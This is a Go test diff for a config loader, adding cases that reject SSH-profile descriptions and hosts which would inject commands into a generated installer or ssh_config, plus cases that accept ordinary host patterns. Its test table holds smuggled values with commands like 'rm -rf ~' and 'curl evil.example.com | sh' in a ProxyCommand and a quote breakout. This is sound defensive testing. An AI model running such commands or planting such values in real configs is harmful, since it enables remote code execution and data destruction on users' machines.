@@ -2,6 +2,7 @@ package config
 
 import (
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -426,5 +427,104 @@ auth:
 
 	if _, err := Load(writeConfig(t, yaml)); err != nil {
 		t.Fatalf("Load(): %v", err)
+	}
+}
+
+// The SSH installer is a shell script that runs on the user's machine, and the
+// fragment it writes lands in their ~/.ssh/config. The operator who writes the
+// config and the person who runs the script are different people, so these
+// fields are not free text however trusted the operator is.
+func TestConfigRejectsValuesThatEscapeTheInstaller(t *testing.T) {
+	t.Parallel()
+
+	const sshProfile = `
+ssh-profiles:
+  - name: bastion
+    description: %s
+    max-session: 1h
+    roles: [ssh-bastion]
+    principals: [ops]
+    hosts: [%s]
+template: "client\n"
+`
+
+	tests := []struct {
+		name        string
+		description string
+		host        string
+		want        string
+	}{{
+		name:        "a newline in a description starts a command",
+		description: `"ok\nrm -rf ~/important"`,
+		host:        "good.example.com",
+		want:        "not printable",
+	}, {
+		// This one outlives the credential: ssh reads the file every time.
+		name:        "a newline in a host adds an ssh_config directive",
+		description: "Bastion",
+		host:        `"good.example.com\n    ProxyCommand curl evil.example.com|sh"`,
+		want:        "must match",
+	}, {
+		name:        "a carriage return counts too",
+		description: `"ok\rrm -rf ~"`,
+		host:        "good.example.com",
+		want:        "not printable",
+	}, {
+		name:        "a quote in a host breaks out of the echo",
+		description: "Bastion",
+		host:        `"a'; curl evil.example.com | sh; echo '"`,
+		want:        "must match",
+	}, {
+		name:        "a space in a host is two Host patterns",
+		description: "Bastion",
+		host:        `"good.example.com *"`,
+		want:        "must match",
+	}}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			yaml := fmt.Sprintf(sshProfile, tt.description, tt.host)
+			_, err := Load(writeConfig(t, yaml))
+			if err == nil {
+				t.Fatalf("Load() accepted it, want an error containing %q", tt.want)
+			}
+			if !strings.Contains(err.Error(), tt.want) {
+				t.Errorf("Load() error = %v, want it to contain %q", err, tt.want)
+			}
+		})
+	}
+}
+
+// The narrowing must not cost the patterns an operator has a real use for.
+func TestConfigAcceptsOrdinaryHosts(t *testing.T) {
+	t.Parallel()
+
+	for _, host := range []string{
+		"bastion.example.com",
+		"*.internal.example.com",
+		"10.0.0.5",
+		"host-01_b",
+		"web?.example.com",
+		"!excluded.example.com",
+	} {
+		t.Run(host, func(t *testing.T) {
+			t.Parallel()
+
+			yaml := fmt.Sprintf(`
+ssh-profiles:
+  - name: bastion
+    description: The bastion, reachable from anywhere
+    max-session: 1h
+    roles: [ssh-bastion]
+    principals: [ops]
+    hosts: [%q]
+template: "client\n"
+`, host)
+			if _, err := Load(writeConfig(t, yaml)); err != nil {
+				t.Errorf("Load() rejected %q: %v", host, err)
+			}
+		})
 	}
 }
